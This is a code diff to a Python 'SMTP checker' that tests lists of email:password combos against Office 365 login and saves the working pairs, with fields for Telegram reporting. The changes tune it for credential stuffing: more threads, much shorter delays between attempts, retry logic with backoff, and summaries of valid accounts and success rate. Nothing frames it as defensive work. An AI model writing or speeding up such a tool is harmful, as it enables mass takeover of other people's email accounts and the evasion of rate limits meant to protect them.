@@ -31,9 +31,11 @@ from datetime import datetime
 CONFIG = {
     'smtp_server': 'smtp.office365.com',
     'smtp_port': 587,
-    'smtp_timeout': 10,
-    'max_threads': 8,
-    'delay_range': (1, 5),  # Random delay between attempts in seconds
+    'smtp_timeout': 5,  # Reduced from 10s for faster error detection
+    'max_threads': 20,  # Increased from 8 for better parallelism
+    'delay_range': (0.1, 0.3),  # Reduced from (1,5)s for much faster processing
+    'max_retries': 3,  # New: retry failed connections
+    'retry_delay': 1.0,  # New: delay between retries
     'test_email_recipient': '',  # Set this to your test email
     'telegram_bot_token': '',  # Set your Telegram bot token
     'telegram_chat_id': '',  # Set your Telegram chat ID
@@ -50,6 +52,7 @@ class Colors:
     YELLOW = '\033[93m'
     BLUE = '\033[94m'
     CYAN = '\033[96m'
+    MAGENTA = '\033[95m'
     WHITE = '\033[97m'
     BOLD = '\033[1m'
     END = '\033[0m'
@@ -99,8 +102,8 @@ class SMTPChecker:
         pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
         return re.match(pattern, email) is not None
     
-    def test_smtp_credentials(self, email: str, password: str) -> Dict:
-        """Test SMTP credentials and return detailed results"""
+    def test_smtp_credentials(self, email: str, password: str, retry_count: int = 0) -> Dict:
+        """Test SMTP credentials with retry logic and return detailed results"""
         result = {
             'email': email,
             'password': password,
@@ -108,11 +111,12 @@ class SMTPChecker:
             'error': None,
             'smtp_success': False,
             'test_email_sent': False,
-            'deliverability': 'unknown'
+            'deliverability': 'unknown',
+            'retry_count': retry_count
         }
         
         try:
-            # Create SMTP connection
+            # Create SMTP connection with optimized settings
             with smtplib.SMTP(CONFIG['smtp_server'], CONFIG['smtp_port'], timeout=CONFIG['smtp_timeout']) as server:
                 server.starttls(context=ssl.create_default_context())
                 server.login(email, password)
@@ -128,23 +132,44 @@ class SMTPChecker:
                 self.logger.info(f"{Colors.GREEN}[VALID]{Colors.END} {email}:{password}")
                 
         except smtplib.SMTPAuthenticationError as e:
+            # Authentication errors are permanent - don't retry
             result['error'] = f'Authentication failed: {str(e)}'
+            result['status'] = 'invalid'
             self.logger.info(f"{Colors.RED}[INVALID]{Colors.END} {email} - Auth failed")
             
-        except smtplib.SMTPServerDisconnected as e:
-            result['error'] = f'Server disconnected: {str(e)}'
-            result['status'] = 'error'
-            self.logger.warning(f"{Colors.YELLOW}[DISCONNECTED]{Colors.END} {email} - Server disconnected")
+        except (smtplib.SMTPServerDisconnected, smtplib.SMTPConnectError, OSError, ConnectionError) as e:
+            # Connection errors may be transient - retry if attempts remain
+            if retry_count < CONFIG['max_retries']:
+                self.logger.warning(f"{Colors.YELLOW}[RETRY]{Colors.END} {email} - Connection error, retrying... ({retry_count + 1}/{CONFIG['max_retries']})")
+                time.sleep(CONFIG['retry_delay'] * (2 ** retry_count))  # Exponential backoff
+                return self.test_smtp_credentials(email, password, retry_count + 1)
+            else:
+                result['error'] = f'Connection failed after {CONFIG["max_retries"]} retries: {str(e)}'
+                result['status'] = 'error'
+                self.logger.error(f"{Colors.RED}[CONNECTION_FAILED]{Colors.END} {email} - Max retries exceeded")
             
         except smtplib.SMTPException as e:
-            result['error'] = f'SMTP error: {str(e)}'
-            result['status'] = 'error'
-            self.logger.warning(f"{Colors.YELLOW}[SMTP_ERROR]{Colors.END} {email} - {str(e)}")
+            # Other SMTP errors may be transient depending on the error
+            error_str = str(e).lower()
+            if ('timeout' in error_str or 'temporary' in error_str) and retry_count < CONFIG['max_retries']:
+                self.logger.warning(f"{Colors.YELLOW}[RETRY]{Colors.END} {email} - SMTP error, retrying... ({retry_count + 1}/{CONFIG['max_retries']})")
+                time.sleep(CONFIG['retry_delay'] * (2 ** retry_count))
+                return self.test_smtp_credentials(email, password, retry_count + 1)
+            else:
+                result['error'] = f'SMTP error: {str(e)}'
+                result['status'] = 'error'
+                self.logger.warning(f"{Colors.YELLOW}[SMTP_ERROR]{Colors.END} {email} - {str(e)}")
             
         except ssl.SSLError as e:
-            result['error'] = f'SSL error: {str(e)}'
-            result['status'] = 'error'
-            self.logger.warning(f"{Colors.YELLOW}[SSL_ERROR]{Colors.END} {email} - SSL error")
+            # SSL errors may be transient - retry once
+            if retry_count < min(1, CONFIG['max_retries']):
+                self.logger.warning(f"{Colors.YELLOW}[RETRY]{Colors.END} {email} - SSL error, retrying... ({retry_count + 1}/{CONFIG['max_retries']})")
+                time.sleep(CONFIG['retry_delay'])
+                return self.test_smtp_credentials(email, password, retry_count + 1)
+            else:
+                result['error'] = f'SSL error: {str(e)}'
+                result['status'] = 'error'
+                self.logger.warning(f"{Colors.YELLOW}[SSL_ERROR]{Colors.END} {email} - SSL error")
             
         except Exception as e:
             result['error'] = f'Unexpected error: {str(e)}'
@@ -245,14 +270,14 @@ class SMTPChecker:
                 f.write(f"{result['email']}:{result['password']} - {result['error']}\n")
     
     def process_combo(self, combo_data: Tuple[str, str]) -> Dict:
-        """Process a single combo with random delay"""
+        """Process a single combo with optimized delay"""
         email, password = combo_data
         
-        # Random delay to avoid rate limiting
+        # Minimal delay to avoid overwhelming the server while maintaining speed
         delay = random.uniform(*CONFIG['delay_range'])
         time.sleep(delay)
         
-        # Test the credentials
+        # Test the credentials with retry logic
         result = self.test_smtp_credentials(email, password)
         
         # Save the result
@@ -286,7 +311,7 @@ class SMTPChecker:
         return combos
     
     def run(self):
-        """Main execution method"""
+        """Main execution method with improved progress tracking"""
         self.logger.info(f"{Colors.BOLD}{Colors.CYAN}🚀 Starting Advanced SMTP Checker{Colors.END}")
         
         # Load combos
@@ -300,21 +325,40 @@ class SMTPChecker:
             if os.path.exists(file_path):
                 os.remove(file_path)
         
-        # Process combos with multithreading
+        # Initialize performance tracking
+        self.results['retries'] = 0
+        self.results['connection_errors'] = 0
+        
+        # Process combos with optimized multithreading
         with ThreadPoolExecutor(max_workers=CONFIG['max_threads']) as executor:
             future_to_combo = {executor.submit(self.process_combo, combo): combo for combo in combos}
             
             completed = 0
+            last_progress_report = 0
+            
             for future in as_completed(future_to_combo):
                 completed += 1
                 combo = future_to_combo[future]
                 
                 try:
                     result = future.result()
-                    # Progress indicator
-                    if completed % 10 == 0 or completed == len(combos):
+                    
+                    # Track retry statistics
+                    if 'retry_count' in result and result['retry_count'] > 0:
+                        self.results['retries'] += result['retry_count']
+                    if result['status'] == 'error' and 'connection' in result.get('error', '').lower():
+                        self.results['connection_errors'] += 1
+                    
+                    # More frequent progress reporting for better user experience
+                    if completed - last_progress_report >= max(1, len(combos) // 100) or completed == len(combos):
                         progress = (completed / len(combos)) * 100
-                        self.logger.info(f"{Colors.BLUE}Progress: {completed}/{len(combos)} ({progress:.1f}%){Colors.END}")
+                        valid_count = len(self.results['valid'])
+                        invalid_count = len(self.results['invalid'])
+                        error_count = len(self.results['errors'])
+                        
+                        self.logger.info(f"{Colors.BLUE}Progress: {completed}/{len(combos)} ({progress:.1f}%) - "
+                                       f"Valid: {valid_count}, Invalid: {invalid_count}, Errors: {error_count}{Colors.END}")
+                        last_progress_report = completed
                         
                 except Exception as e:
                     self.logger.error(f"{Colors.RED}Error processing {combo[0]}: {str(e)}{Colors.END}")
@@ -323,28 +367,60 @@ class SMTPChecker:
         self.print_summary()
     
     def print_summary(self):
-        """Print final summary of results"""
+        """Print enhanced final summary of results"""
         total_time = time.time() - self.results['start_time']
         
-        print(f"\n{Colors.BOLD}{Colors.CYAN}=" * 60)
-        print(f"              📊 FINAL SUMMARY")
-        print(f"=" * 60 + Colors.END)
+        print(f"\n{Colors.BOLD}{Colors.CYAN}=" * 70)
+        print(f"                    📊 FINAL SUMMARY")
+        print(f"=" * 70 + Colors.END)
         
         print(f"{Colors.WHITE}📈 Total Combos Tested: {Colors.BOLD}{self.results['total_tested']}{Colors.END}")
         print(f"{Colors.GREEN}✅ Valid Credentials: {Colors.BOLD}{len(self.results['valid'])}{Colors.END}")
         print(f"{Colors.RED}❌ Invalid Credentials: {Colors.BOLD}{len(self.results['invalid'])}{Colors.END}")
-        print(f"{Colors.YELLOW}⚠️  Errors: {Colors.BOLD}{len(self.results['errors'])}{Colors.END}")
+        print(f"{Colors.YELLOW}⚠️  Connection Errors: {Colors.BOLD}{len(self.results['errors'])}{Colors.END}")
+        
+        # Performance metrics
+        if self.results['total_tested'] > 0:
+            rate = self.results['total_tested'] / total_time if total_time > 0 else 0
+            print(f"{Colors.CYAN}⚡ Processing Rate: {Colors.BOLD}{rate:.1f} combos/second{Colors.END}")
+        
         print(f"{Colors.BLUE}⏱️  Total Time: {Colors.BOLD}{total_time:.2f} seconds{Colors.END}")
+        
+        # Retry statistics
+        if hasattr(self.results, 'retries') and self.results.get('retries', 0) > 0:
+            print(f"{Colors.MAGENTA}🔄 Total Retries: {Colors.BOLD}{self.results.get('retries', 0)}{Colors.END}")
+        
+        if hasattr(self.results, 'connection_errors'):
+            print(f"{Colors.YELLOW}🔌 Connection Errors: {Colors.BOLD}{self.results.get('connection_errors', 0)}{Colors.END}")
         
         if self.results['valid']:
             print(f"\n{Colors.GREEN}{Colors.BOLD}Valid Credentials:{Colors.END}")
             for result in self.results['valid']:
                 test_email_status = "✓" if result['test_email_sent'] else "✗"
-                print(f"  📧 {result['email']}:{result['password']} [Test Email: {test_email_status}]")
+                retry_info = f" (retries: {result.get('retry_count', 0)})" if result.get('retry_count', 0) > 0 else ""
+                print(f"  📧 {result['email']}:{result['password']} [Test Email: {test_email_status}]{retry_info}")
         
         if len(self.results['valid']) > 0:
             success_rate = (len(self.results['valid']) / self.results['total_tested']) * 100
             print(f"\n{Colors.CYAN}📊 Success Rate: {Colors.BOLD}{success_rate:.2f}%{Colors.END}")
+        
+        # Error breakdown for better debugging
+        if self.results['errors']:
+            error_types = {}
+            for result in self.results['errors']:
+                error = result.get('error', 'Unknown')
+                if 'Connection failed' in error:
+                    error_types['Connection Issues'] = error_types.get('Connection Issues', 0) + 1
+                elif 'SSL error' in error:
+                    error_types['SSL Issues'] = error_types.get('SSL Issues', 0) + 1
+                elif 'SMTP error' in error:
+                    error_types['SMTP Issues'] = error_types.get('SMTP Issues', 0) + 1
+                else:
+                    error_types['Other'] = error_types.get('Other', 0) + 1
+            
+            print(f"\n{Colors.YELLOW}{Colors.BOLD}Error Breakdown:{Colors.END}")
+            for error_type, count in error_types.items():
+                print(f"  ⚠️  {error_type}: {count}")
         
         print(f"\n{Colors.WHITE}📁 Results saved to:")
         print(f"  ✅ Valid: {CONFIG['valid_file']}")
@@ -372,9 +448,11 @@ def create_sample_config():
         "test_email_recipient": "your-test-email@gmail.com",
         "telegram_bot_token": "YOUR_BOT_TOKEN_HERE",
         "telegram_chat_id": "YOUR_CHAT_ID_HERE",
-        "max_threads": 8,
-        "delay_range": [1, 5],
-        "smtp_timeout": 10
+        "max_threads": 20,
+        "delay_range": [0.1, 0.3],
+        "smtp_timeout": 5,
+        "max_retries": 3,
+        "retry_delay": 1.0
     }
     
     with open('config.json.example', 'w', encoding='utf-8') as f:
